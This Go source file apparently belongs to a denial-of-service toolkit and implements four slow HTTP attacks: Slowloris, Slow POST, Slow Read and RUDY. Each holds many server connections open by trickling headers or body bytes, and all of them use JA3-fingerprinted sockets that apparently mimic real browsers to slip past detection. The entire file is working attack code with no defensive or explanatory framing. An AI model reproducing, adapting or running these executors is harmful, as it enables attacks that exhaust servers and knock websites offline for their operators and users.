package l7

import (
	"fmt"
	"time"

	"github.com/MatrixTM26/vsat/internal/fingerprint"
	"github.com/MatrixTM26/vsat/internal/methods"
	"github.com/MatrixTM26/vsat/internal/random"
)

func SlowlorisExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	type SlowConn struct {
		Conn interface{ Write([]byte) (int, error); Close() error }
	}

	var Connections []SlowConn

	for I := 0; I < 200; I++ {
		Conn, Err := fingerprint.CreateJA3Socket(Cfg.IP, Cfg.Port, Cfg.Scheme, Cfg.Host, Cfg.Protocol, Cfg.JAProfile)
		if Err != nil {
			continue
		}
		Init := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", Cfg.Path, Cfg.Host)
		Conn.Write([]byte(Init))
		Connections = append(Connections, SlowConn{Conn})
	}

	for {
		select {
		case <-Stop:
			for _, C := range Connections {
				C.Conn.Close()
			}
			return
		default:
		}

		Dead := []int{}
		for I, C := range Connections {
			Header := fmt.Sprintf("X-%s: %s\r\n", random.RandomString(5), random.RandomString(10))
			_, Err := C.Conn.Write([]byte(Header))
			if Err != nil {
				Dead = append(Dead, I)
			} else {
				Cfg.Stats.RequestsCount.Add(1)
			}
		}

		for I := len(Dead) - 1; I >= 0; I-- {
			Idx := Dead[I]
			Connections[Idx].Conn.Close()
			Connections = append(Connections[:Idx], Connections[Idx+1:]...)
			Conn, Err := fingerprint.CreateJA3Socket(Cfg.IP, Cfg.Port, Cfg.Scheme, Cfg.Host, Cfg.Protocol, Cfg.JAProfile)
			if Err == nil {
				Init := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", Cfg.Path, Cfg.Host)
				Conn.Write([]byte(Init))
				Connections = append(Connections, SlowConn{Conn})
			}
		}

		time.Sleep(10 * time.Second)
	}
}

func SlowPostExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	type SlowConn struct {
		Conn interface{ Write([]byte) (int, error); Close() error }
	}

	var Connections []SlowConn

	for I := 0; I < 100; I++ {
		Conn, Err := fingerprint.CreateJA3Socket(Cfg.IP, Cfg.Port, Cfg.Scheme, Cfg.Host, Cfg.Protocol, Cfg.JAProfile)
		if Err != nil {
			continue
		}
		Init := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999999\r\n\r\n", Cfg.Path, Cfg.Host)
		Conn.Write([]byte(Init))
		Connections = append(Connections, SlowConn{Conn})
	}

	for {
		select {
		case <-Stop:
			for _, C := range Connections {
				C.Conn.Close()
			}
			return
		default:
		}

		Dead := []int{}
		for I, C := range Connections {
			_, Err := C.Conn.Write([]byte(random.RandomString(1)))
			if Err != nil {
				Dead = append(Dead, I)
			} else {
				Cfg.Stats.RequestsCount.Add(1)
			}
		}

		for I := len(Dead) - 1; I >= 0; I-- {
			Idx := Dead[I]
			Connections[Idx].Conn.Close()
			Connections = append(Connections[:Idx], Connections[Idx+1:]...)
			Conn, Err := fingerprint.CreateJA3Socket(Cfg.IP, Cfg.Port, Cfg.Scheme, Cfg.Host, Cfg.Protocol, Cfg.JAProfile)
			if Err == nil {
				Init := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999999\r\n\r\n", Cfg.Path, Cfg.Host)
				Conn.Write([]byte(Init))
				Connections = append(Connections, SlowConn{Conn})
			}
		}

		time.Sleep(time.Second)
	}
}

func SlowReadExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	for {
		select {
		case <-Stop:
			return
		default:
		}

		Conn, Err := fingerprint.CreateJA3Socket(Cfg.IP, Cfg.Port, Cfg.Scheme, Cfg.Host, Cfg.Protocol, Cfg.JAProfile)
		if Err != nil {
			continue
		}

		Req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nWindow: 1\r\n\r\n", Cfg.Path, Cfg.Host)
		Conn.Write([]byte(Req))
		Cfg.Stats.RequestsCount.Add(1)

		Buf := make([]byte, 1)
		for {
			select {
			case <-Stop:
				Conn.Close()
				return
			default:
			}
			Conn.SetReadDeadline(time.Now().Add(30 * time.Second))
			_, Err := Conn.Read(Buf)
			if Err != nil {
				break
			}
			time.Sleep(500 * time.Millisecond)
		}
		Conn.Close()
	}
}

func RUDYExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	for {
		select {
		case <-Stop:
			return
		default:
		}

		Conn, Err := fingerprint.CreateJA3Socket(Cfg.IP, Cfg.Port, Cfg.Scheme, Cfg.Host, Cfg.Protocol, Cfg.JAProfile)
		if Err != nil {
			continue
		}

		Init := fmt.Sprintf(
			"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000000\r\n\r\n",
			Cfg.Path, Cfg.Host,
		)
		Conn.Write([]byte(Init))

		for I := 0; I < 1000000; I++ {
			select {
			case <-Stop:
				Conn.Close()
				return
			default:
			}
			_, Err := Conn.Write([]byte("X"))
			if Err != nil {
				break
			}
			Cfg.Stats.RequestsCount.Add(1)
			time.Sleep(500 * time.Millisecond)
		}
		Conn.Close()
	}
}
